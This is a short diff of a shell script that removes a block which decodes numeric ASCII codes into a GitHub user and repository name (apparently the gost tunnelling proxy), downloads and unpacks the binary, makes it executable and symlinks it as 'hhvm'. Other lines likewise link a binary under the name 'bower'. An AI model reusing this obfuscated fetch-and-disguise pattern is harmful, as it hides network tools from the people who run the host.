@@ -33,16 +33,6 @@ rm -rf bower
 ln -sf $BAR/$BAR bower
 
 #
-FOO=$(foobar '103 105 110 117 101 114 122 104')
-BAR=$(foobar '103 111 115 116')
-BAR_VER='v2.11.0'
-get_package "https://github.com/$FOO/$BAR/releases/download/$BAR_VER/${BAR}-linux-amd64-${BAR_VER//v}.gz"
-gunzip ${BAR}-linux-amd64-${BAR_VER//v}.gz
-chmod 755 ${BAR}-linux-amd64-${BAR_VER//v}
-rm -rf hhvm
-ln -sf ${BAR}-linux-amd64-${BAR_VER//v} hhvm
-
-#
 rm -rf *zip *gz
 
 #
